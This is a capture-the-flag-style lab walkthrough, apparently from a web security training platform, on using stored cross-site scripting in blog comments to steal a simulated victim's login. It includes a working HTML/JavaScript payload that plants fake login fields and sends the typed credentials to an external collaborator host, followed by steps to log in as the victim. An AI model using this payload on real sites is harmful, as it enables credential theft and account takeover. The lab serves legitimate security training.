# Lab 5: Exploiting cross-site scripting to capture passwords

## ğŸ“ Lab Overview

This lab features a **stored cross-site scripting (XSS)** vulnerability in the blog comment function. A simulated victim user **automatically views** all posted comments, providing an opportunity to run a malicious script that captures their **login credentials**.

---

## âš ï¸ Important Notes

- ğŸ›¡ï¸ The lab platform **blocks outgoing requests** to arbitrary domains â€” use only **Burp Collaborator's default public server**.
- ğŸ’¡ A **less subtle alternative** method involving CSRF exists, but it's discouraged due to evidence exposure.

---

## ğŸ› ï¸ Solution Steps

### ğŸ”— 1. Get Your Burp Collaborator Subdomain

- Open **Burp Suite Professional**
- Go to the **Collaborator** tab
- Click **"Copy to clipboard"** to copy your unique **subdomain**

---

### ğŸ’¬ 2. Submit the XSS Payload in a Blog Comment

Post the following **HTML+JS payload** in the blog comment field (replace `BURP-COLLABORATOR-SUBDOMAIN` with your actual subdomain):

```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
  method:'POST',
  mode: 'no-cors',
  body:username.value+':'+this.value
});">

```

ğŸ§  **How it works:**

- Adds fake login fields.
- When the victim types a password, the `onchange` event triggers.
- The credentials are **POSTed** silently to your Burp Collaborator subdomain.

---

### ğŸ“¡ 3. Capture the Credentials

- Go back to **Burp Collaborator**
- Click **"Poll now"**
- You should see an **HTTP interaction**
- Copy the **username and password** from the request `body`

---

### ğŸ” 4. Log In as the Victim

- Use the **captured credentials** to log in through the labâ€™s login form
- ğŸ¯ If successful, the lab is **solved**

---

## ğŸš§ Alternative (Less Recommended)

You could modify the attack to use **CSRF** to publicly submit the victim's credentials in a comment.

âš ï¸ **Drawbacks:**

- Credentials are exposed in public
- Leaves **forensic evidence** of the attack

---

## ğŸ¥ Community Solution

ğŸ“º [Watch on YouTube](https://youtu.be/I6TOtXSOZ90)